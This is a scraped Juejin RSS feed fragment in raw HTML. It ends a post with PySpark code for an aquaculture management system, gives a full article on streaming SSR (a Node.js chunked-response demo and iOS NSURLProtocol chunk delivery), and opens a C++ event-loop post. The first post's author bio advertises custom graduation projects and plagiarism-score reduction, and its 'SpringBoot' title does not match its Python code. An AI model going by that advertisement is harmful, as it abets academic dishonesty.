<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/daa8f36111b14bb989bd12d1dfd1b4e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=Q0o2kokPYSGzYZfSZoiACZa%2FQ0E%3D" alt="用户管理.png" loading="lazy"/></p>
<h2 data-id="heading-3">基于SpringBoot的水产养殖管理系统代码展示</h2>
<pre><code class="hljs language-dart" lang="dart"># Big Data processing <span class="hljs-keyword">with</span> SparkSession.builder <span class="hljs-keyword">is</span> utilized <span class="hljs-keyword">for</span> advanced analytics and recommendation engines.
# All necessary imports are grouped at the top.
from pyspark.sql <span class="hljs-keyword">import</span> SparkSession
from pyspark.sql.functions <span class="hljs-keyword">import</span> avg, col, datediff, to_date, lit, count, when
from pyspark.ml.recommendation <span class="hljs-keyword">import</span> ALS
from pyspark.sql.types <span class="hljs-keyword">import</span> StructType, StructField, IntegerType, FloatType
from datetime <span class="hljs-keyword">import</span> datetime
<span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd # Used <span class="hljs-keyword">for</span> simulating small data <span class="hljs-keyword">for</span> Spark DataFrame creation <span class="hljs-keyword">if</span> needed, but not <span class="hljs-keyword">for</span> core logic itself
# --- Core Functionality <span class="hljs-number">1</span>: 养殖记录管理 (Farming Record Analytics) ---
# Analyzes historical farming records using Spark to detect anomalies or predict trends.
def analyze_farming_records_spark(record_data_path: str, species_thresholds: dict):
    spark = SparkSession.builder \
        .appName(<span class="hljs-string">"FarmingRecordAnalytics"</span>) \
        .config(<span class="hljs-string">"spark.some.config.option"</span>, <span class="hljs-string">"some-value"</span>) \
        .getOrCreate()
    df = spark.read.csv(record_data_path, header=True, inferSchema=True)
    df = df.withColumn(<span class="hljs-string">"record_date"</span>, to_date(col(<span class="hljs-string">"record_date"</span>), <span class="hljs-string">"yyyy-MM-dd"</span>)) \
           .withColumn(<span class="hljs-string">"feed_amount_kg"</span>, col(<span class="hljs-string">"feed_amount"</span>).cast(<span class="hljs-string">"double"</span>)) \
           .withColumn(<span class="hljs-string">"growth_rate_g_day"</span>, col(<span class="hljs-string">"growth_rate"</span>).cast(<span class="hljs-string">"double"</span>))
    growth_analysis = df.groupBy(<span class="hljs-string">"species_id"</span>, <span class="hljs-string">"record_date"</span>) \
                        .agg(avg(<span class="hljs-string">"growth_rate_g_day"</span>).alias(<span class="hljs-string">"avg_growth_rate"</span>))
    anomalous_records = growth_analysis.join(
        spark.createDataFrame(list(species_thresholds.items()), [<span class="hljs-string">"species_id"</span>, <span class="hljs-string">"min_growth_threshold"</span>]),
        <span class="hljs-keyword">on</span>=<span class="hljs-string">"species_id"</span>
    ).filter(col(<span class="hljs-string">"avg_growth_rate"</span>) &lt; col(<span class="hljs-string">"min_growth_threshold"</span>))
    anomalies_collected = anomalous_records.collect()
    results = []
    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> anomalies_collected:
        results.append(f<span class="hljs-string">"Anomaly detected for Species {row['species_id']} on {row['record_date']}: Average growth rate {row['avg_growth_rate']:.2f}g/day is below threshold {row['min_growth_threshold']:.2f}g/day."</span>)
    spark.stop()
    <span class="hljs-keyword">return</span> results
# --- Core Functionality <span class="hljs-number">2</span>: 水产订单管理 (Aquaculture Order Processing) ---
# Processes <span class="hljs-keyword">new</span> aquaculture product orders, including stock validation and inventory updates.
# Simulates database interactions using global dictionaries.
db_products_sim = {
    <span class="hljs-number">1</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-number">1</span>, <span class="hljs-string">"name"</span>: <span class="hljs-string">"Tilapia"</span>, <span class="hljs-string">"price"</span>: <span class="hljs-number">12.5</span>, <span class="hljs-string">"stock"</span>: <span class="hljs-number">100</span>},
    <span class="hljs-number">2</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-number">2</span>, <span class="hljs-string">"name"</span>: <span class="hljs-string">"Shrimp"</span>, <span class="hljs-string">"price"</span>: <span class="hljs-number">25.0</span>, <span class="hljs-string">"stock"</span>: <span class="hljs-number">200</span>},
    <span class="hljs-number">3</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-number">3</span>, <span class="hljs-string">"name"</span>: <span class="hljs-string">"Salmon"</span>, <span class="hljs-string">"price"</span>: <span class="hljs-number">30.0</span>, <span class="hljs-string">"stock"</span>: <span class="hljs-number">50</span>},
}
db_orders_sim = {}
db_order_items_sim = []
order_id_counter = <span class="hljs-number">1</span>
def process_aquaculture_order(user_id: <span class="hljs-built_in">int</span>, order_items_data: list):
    global order_id_counter
    <span class="hljs-keyword">if</span> not order_items_data:
        raise ValueError(<span class="hljs-string">"Order must contain items."</span>)
    total_amount = <span class="hljs-number">0.0</span>
    products_to_update = {}
    <span class="hljs-keyword">for</span> item_data <span class="hljs-keyword">in</span> order_items_data:
        product_id = item_data.<span class="hljs-keyword">get</span>(<span class="hljs-string">"product_id"</span>)
        quantity = item_data.<span class="hljs-keyword">get</span>(<span class="hljs-string">"quantity"</span>)
        <span class="hljs-keyword">if</span> not product_id or not quantity or quantity &lt;= <span class="hljs-number">0</span>:
            raise ValueError(<span class="hljs-string">"Invalid product ID or quantity in order item."</span>)
        product = db_products_sim.<span class="hljs-keyword">get</span>(product_id)
        <span class="hljs-keyword">if</span> not product:
            raise ValueError(f<span class="hljs-string">"Product with ID {product_id} not found."</span>)
        <span class="hljs-keyword">if</span> product[<span class="hljs-string">"stock"</span>] &lt; quantity:
            raise ValueError(f<span class="hljs-string">"Insufficient stock for product {product['name']}. Available: {product['stock']}, Requested: {quantity}."</span>)
        sub_total = product[<span class="hljs-string">"price"</span>] * quantity
        total_amount += sub_total
        products_to_update[product_id] = {<span class="hljs-string">"product_ref"</span>: product, <span class="hljs-string">"quantity"</span>: quantity, <span class="hljs-string">"unit_price"</span>: product[<span class="hljs-string">"price"</span>]}
    new_order_id = order_id_counter
    order_id_counter += <span class="hljs-number">1</span>
    new_order = {
        <span class="hljs-string">"id"</span>: new_order_id,
        <span class="hljs-string">"user_id"</span>: user_id,
        <span class="hljs-string">"order_date"</span>: datetime.now(),
        <span class="hljs-string">"total_amount"</span>: total_amount,
        <span class="hljs-string">"status"</span>: <span class="hljs-string">"CONFIRMED"</span>,
        <span class="hljs-string">"items"</span>: []
    }
    db_orders_sim[new_order_id] = new_order
    <span class="hljs-keyword">for</span> product_id, item_info <span class="hljs-keyword">in</span> products_to_update.items():
        order_item = {
            <span class="hljs-string">"order_id"</span>: new_order_id,
            <span class="hljs-string">"product_id"</span>: item_info[<span class="hljs-string">"product_ref"</span>][<span class="hljs-string">"id"</span>],
            <span class="hljs-string">"quantity"</span>: item_info[<span class="hljs-string">"quantity"</span>],
            <span class="hljs-string">"unit_price"</span>: item_info[<span class="hljs-string">"unit_price"</span>]
        }
        db_order_items_sim.append(order_item)
        item_info[<span class="hljs-string">"product_ref"</span>][<span class="hljs-string">"stock"</span>] -= item_info[<span class="hljs-string">"quantity"</span>]
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"order_id"</span>: new_order[<span class="hljs-string">"id"</span>], <span class="hljs-string">"total_amount"</span>: new_order[<span class="hljs-string">"total_amount"</span>], <span class="hljs-string">"status"</span>: new_order[<span class="hljs-string">"status"</span>]}
# --- Core Functionality <span class="hljs-number">3</span>: 水产推荐系统 (Aquaculture Product Recommendation Engine) ---
# Generates personalized aquaculture product recommendations using Spark<span class="hljs-string">'s ALS algorithm.
def get_aquaculture_recommendations_spark(interaction_data_path: str, user_id_to_recommend: int, num_recommendations: int = 5):
    spark = SparkSession.builder \
        .appName("AquacultureRecommendationEngine") \
        .config("spark.some.other.config.option", "another-value") \
        .getOrCreate()
    schema = StructType([
        StructField("user_id", IntegerType(), True),
        StructField("product_id", IntegerType(), True),
        StructField("rating", FloatType(), True)
    ])
    interactions_df = spark.read.csv(interaction_data_path, header=True, schema=schema)
    als = ALS(maxIter=5, regParam=0.01, userCol="user_id", itemCol="product_id", ratingCol="rating",
              coldStartStrategy="drop")
    model = als.fit(interactions_df)
    user_df = spark.createDataFrame([(user_id_to_recommend,)], ["user_id"])
    recommendations = model.recommendForUserSubset(user_df, num_recommendations)
    recommended_product_ids = []
    if recommendations.count() &gt; 0:
        for row in recommendations.collect()[0]["recommendations"]:
            recommended_product_ids.append(row["product_id"])
    spark.stop()
    return recommended_product_ids
</span></code></pre>
<h2 data-id="heading-4">基于SpringBoot的水产养殖管理系统文档展示</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab8f270cf20849deabba7f02492a91ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K6h566X5py65q-V5Lia6K6-6K6h5bCP6YCU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478245&amp;x-signature=qTpbat7rDSSgocev9ijQZljSUZ4%3D" alt="文档.png" loading="lazy"/></p>
<blockquote>
<p>💖💖作者：计算机毕业设计小途
💙💙个人简介：曾长期从事计算机专业培训教学，本人也热爱上课教学，语言擅长Java、微信小程序、Python、Golang、安卓Android等，开发项目包括大数据、深度学习、网站、小程序、安卓、算法。平常会做一些项目定制化开发、代码讲解、答辩教学、文档编写、也懂一些降重方面的技巧。平常喜欢分享一些自己开发中遇到的问题的解决办法，也喜欢交流技术，大家有技术代码这一块的问题可以问我！
💛💛想说的话：感谢大家的关注与支持！
💜💜
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011385.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011385.html" ref="nofollow noopener noreferrer">网站实战项目</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011386.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011386.html" ref="nofollow noopener noreferrer">安卓/小程序实战项目</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011387.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011387.html" ref="nofollow noopener noreferrer">大数据实战项目</a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2501_92808674%2Fcategory_13011390.html" target="_blank" title="https://blog.csdn.net/2501_92808674/category_13011390.html" ref="nofollow noopener noreferrer">深度学习实战项目</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[浅入理解流式SSR的性能收益与工作原理]]></title>    <link>https://juejin.cn/post/7575090551357407284</link>    <guid>https://juejin.cn/post/7575090551357407284</guid>    <pubDate>2025-11-23T04:51:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575090551357407284" data-draft-id="7570912420568481802" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="浅入理解流式SSR的性能收益与工作原理"/> <meta itemprop="keywords" content="前端,iOS"/> <meta itemprop="datePublished" content="2025-11-23T04:51:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="明远湖之鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2370998127573751"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            浅入理解流式SSR的性能收益与工作原理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2370998127573751/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    明远湖之鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T04:51:36.000Z" title="Sun Nov 23 2025 04:51:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">什么是流式 SSR</h2>
<p>流式 SSR（Streaming Server-Side Rendering）是一种将服务端渲染和流式传输结合起来的技术。与传统的 SSR 不同，流式 SSR 可以在服务端渲染的同时，逐步将渲染结果传输到客户端，实现页面的渐进式展示。</p>
<p>在流式 SSR 中，服务端会根据客户端的请求，逐步生成页面内容，并将它们作为流式数据流式传输到客户端。客户端可以在接收到一部分数据后，就开始逐步显示页面，而不需要等待整个页面渲染完成。这种方式可以有效提高页面的加载速度和用户体验。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c8d597f865b43c79abefb42c03ca09c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO6L-c5rmW5LmL6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478296&amp;x-signature=7%2BPppr%2BKU2I0Z%2BX22ELwntltuHU%3D" alt="20251111002406.jpg" loading="lazy"/>
(流式 SSR 的页面加载过程）</p>
<h2 data-id="heading-1">使用流式 SSR 的收益</h2>
<ul>
<li>
<p><strong>减少设备和网络情况的副作用</strong></p>
<p>这是 SSR 渲染模式相比于传统  CSR 渲染模式带来的优势，对于流式 SSR 应用同样适用。
CSR 渲染模式需要在终端设备上完成资源加载、数据加载以及整个渲染过程，受端侧设备自身 CPU 及网络性能影响大，如设备 CPU 性能不足或网络波动较大，则此时整个页面加载性能将严重下降，这也是为什么很多页面在高端设备上加载速度较快，但在低端设备上需要7-8秒的原因。</p>
<p>而 SSR 的渲染模式，则<strong>在服务端提供了高性能的渲染容器及网络环境，服务端的渲染，不受端侧设备 CPU 或网络影响，始终提供稳定的渲染性能表现</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba73baf6b12b44a0b7b6055b1c45b7fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO6L-c5rmW5LmL6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478296&amp;x-signature=vYH5fhaZmJ1rFH8%2FPW4m4SNzkW0%3D" alt="fa9a1944-b6b4-4e22-980a-47bf604c2e2c.png" loading="lazy"/></p>
</li>
<li>
<p><strong>减少接口过慢对首屏性能的影响</strong></p>
<p>通常，页面会由多个区块组成，其中一些区块不依赖于数据，而其他区块可能依赖于快速或缓慢响应的接口。</p>
<p>现有 SSR 渲染模式存在的一个不足是，整个渲染过程是同步的，需要在页面渲染之前完成所有数据请求，并一次性返回整个页面的 HTML。如果页面的某些接口响应过慢，将会导致整个页面的响应时间过长。</p>
<p>流式渲染的最大好处在于它可以分块返回页面内容。例如，当请求进入时，它可以首先完成页面静态内容的渲染并响应给端侧进行渲染，等待其他依赖于数据的区块完成渲染后再分块返回。这样整个页面的渲染过程不再绑定在一起，而是一个异步的过程，先完成渲染的部分将先返回，从而优化了页面响应速度。</p>
</li>
<li>
<p><strong>提前资源的加载时机</strong></p>
<p>流式 SSR 相比传统 SSR 应用有另一个额外的收益是，由于 HTML 可以分块返回，页面的资源信息可以随第一个 HTML 片段一起下发，从而尽快开始加载。相比之下，在传统 SSR 应用中，资源信息必须等待整个 HTML 完成渲染后下发，请求开始的时机会受到渲染过程的阻塞。</p>
<p>采用流式 SSR，可以使资源请求和页面渲染过程并行进行，进一步提升了页面的性能表现。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/262454a66ef1469789c973908bdfdf86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO6L-c5rmW5LmL6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478296&amp;x-signature=pueQsCLST%2FVr2owHTM95M6HTlvU%3D" alt="752472f2-cf39-4c89-9738-e4ad3e084ba9.png" loading="lazy"/></p>
</li>
<li>
<p><strong>提升页面的可交互时间</strong></p>
<p>在 SSR 渲染模式下，将页面节点达到可交互状态的过程称为 Hydrate，它需要在端侧执行 JavaScript。</p>
<p>由于页面资源可以提前下发，并且 React 18 对 Hydrate 进行了异步化处理，在流式 SSR 应用中，可以进一步实现先渲染的页面先达到可交互状态的效果。对于部分首屏接口较慢的应用，这将进一步提升页面的可交互体验。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb6d50f24ad84d6397f6b472e57ce551~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5piO6L-c5rmW5LmL6bG8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764478296&amp;x-signature=sxEYVIj6yhciBVEKqwOPNJXnz1c%3D" alt="20251111002828.jpg" loading="lazy"/></p>
</li>
</ul>
<h2 data-id="heading-2">基本工作原理</h2>
<p>流式 SSR 的实现，最基本的原理是：</p>
<ul>
<li>基于 HTTP 协议中的 chunked 编码规范，设置响应头的 Transfer-Encoding 为 chunked 对 HTML 内容进行分块传输。</li>
<li>在浏览器侧，流式地读取数据并进行渲染，这是主流浏览器默认支持的。</li>
</ul>
<p>结合 Node.js 内置的 HTTP 模块，实现一个最简单的流式 DEMO 示例如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">'http'</span>);

<span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-keyword">async</span> (req, res) =&gt; {
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'text/html'</span>);
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'Transfer-Encoding'</span>, <span class="hljs-string">'chunked'</span>)

  <span class="hljs-comment">// 分区块的传输页面内容</span>
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;html&gt;'</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;head&gt;&lt;title&gt;Stream Demo&lt;/title&gt;&lt;head&gt;'</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;body&gt;'</span>);

  <span class="hljs-comment">// 模拟服务端暂停</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3000</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;h2&gt;Hello&lt;/h2&gt;'</span>);

  <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">3000</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;h2&gt;ICE 3&lt;/h2&gt;'</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-string">'&lt;/body&gt;&lt;/html&gt;'</span>);
  res.<span class="hljs-title function_">end</span>();
});

server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);
</code></pre>
<p>基于这个基本原理，将页面分为骨架屏和几个区块，并行地渲染这些区块，然后将渲染好的区块分段返回，就可以实现基本的流式 SSR 。</p>
<h2 data-id="heading-3">WebView 接收流式Chunk渲染的实现原理（iOS）</h2>
<h3 data-id="heading-4">核心组件</h3>
<p>iOS WebView 接收流式 Chunk 渲染基于 <strong>NSURLProtocol 拦截机制</strong> + <strong>NSURLProtocolClient 回调机制</strong> 实现。</p>
<p><strong>NSURLProtocol（请求拦截器）</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 拦截 WebView 的网络请求</span>
+ (<span class="hljs-variable constant_">BOOL</span>)<span class="hljs-attr">canInitWithRequest</span>:(<span class="hljs-title class_">NSURLRequest</span> *)request {
    <span class="hljs-keyword">return</span> [self <span class="hljs-attr">shouldInterceptRequest</span>:request];
}

- (<span class="hljs-keyword">void</span>)startLoading {
    <span class="hljs-comment">// 转发给自定义处理器</span>
    [[<span class="hljs-title class_">SSRHandler</span> shareInstance] <span class="hljs-attr">sendRequest</span>:self.<span class="hljs-property">request</span> <span class="hljs-attr">delegate</span>:self];
}
</code></pre>
<p><strong>NSURLProtocolClient（数据传递桥梁）</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 系统提供的协议，用于向 WebView 传递数据</span>
@protocol <span class="hljs-title class_">NSURLProtocolClient</span>
- (<span class="hljs-keyword">void</span>)<span class="hljs-title class_">URLProtocol</span>:<span class="hljs-attr">didReceiveResponse</span>:<span class="hljs-attr">cacheStoragePolicy</span>:;  <span class="hljs-comment">// 响应头</span>
- (<span class="hljs-keyword">void</span>)<span class="hljs-title class_">URLProtocol</span>:<span class="hljs-attr">didLoadData</span>:;                           <span class="hljs-comment">// 数据块（可多次）</span>
- (<span class="hljs-keyword">void</span>)<span class="hljs-title class_">URLProtocolDidFinishLoading</span>:;                       <span class="hljs-comment">// 完成</span>
- (<span class="hljs-keyword">void</span>)<span class="hljs-title class_">URLProtocol</span>:<span class="hljs-attr">didFailWithError</span>:;                      <span class="hljs-comment">// 错误</span>
@end

</code></pre>
<h3 data-id="heading-5">渲染流程</h3>
<ul>
<li>
<p><strong>阶段一：请求拦截</strong></p>
<pre><code class="hljs language-objectivec" lang="objectivec">WebView 发起请求 → <span class="hljs-built_in">NSURLProtocol</span> 拦截 → 转发给 SSR 处理器
</code></pre>
</li>
<li>
<p><strong>阶段二：响应处理</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 1. 返回响应头</span>
[<span class="hljs-meta">client URLProtocol:protocol didReceiveResponse:response cacheStoragePolicy:policy</span>];

<span class="hljs-comment">// 2. 流式返回数据（关键步骤）</span>
[<span class="hljs-meta">client URLProtocol:protocol didLoadData:chunk1</span>];  <span class="hljs-comment">// 第1块</span>
[<span class="hljs-meta">client URLProtocol:protocol didLoadData:chunk2</span>];  <span class="hljs-comment">// 第2块</span>
[<span class="hljs-meta">client URLProtocol:protocol didLoadData:chunkN</span>];  <span class="hljs-comment">// 第N块</span>

<span class="hljs-comment">// 3. 标记完成</span>
[<span class="hljs-meta">client URLProtocolDidFinishLoading:protocol</span>];
</code></pre>
</li>
<li>
<p><strong>阶段三：WebView 渲染</strong></p>
<pre><code class="hljs language-css" lang="css">每次 didLoadData 调用 → WebView 增量解析 <span class="hljs-selector-tag">HTML</span> → 实时渲染到页面
</code></pre>
</li>
</ul>
<p><strong>数据流图示如下</strong>：</p>
<pre><code class="hljs language-scss" lang="scss">┌─────────────┐    ┌──────────────┐    ┌─────────────┐
│   WebView   │───▶│NSURLProtocol │───▶│ SSR Handler │
│             │    │              │    │             │
│             │◀───│              │◀───│             │
└─────────────┘    └──────────────┘    └─────────────┘
       ▲                   │
       │                   ▼
   增量渲染          NSURLProtocolClient
       ▲                   │
       │                   ▼
   ┌─────────────────────────────┐
   │     didLoadData (chunk1)    │
   │     didLoadData (chunk2)    │
   │     didLoadData (chunkN)    │
   │  URLProtocolDidFinishLoading │
   └─────────────────────────────┘
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JHandler——一套简单易用的 C++ 事件循环机制]]></title>    <link>https://juejin.cn/post/7575349314945368105</link>    <guid>https://juejin.cn/post/7575349314945368105</guid>    <pubDate>2025-11-23T04:52:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575349314945368105" data-draft-id="7575159361904345129" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JHandler——一套简单易用的 C++ 事件循环机制"/> <meta itemprop="keywords" content="Android,HarmonyOS,C++"/> 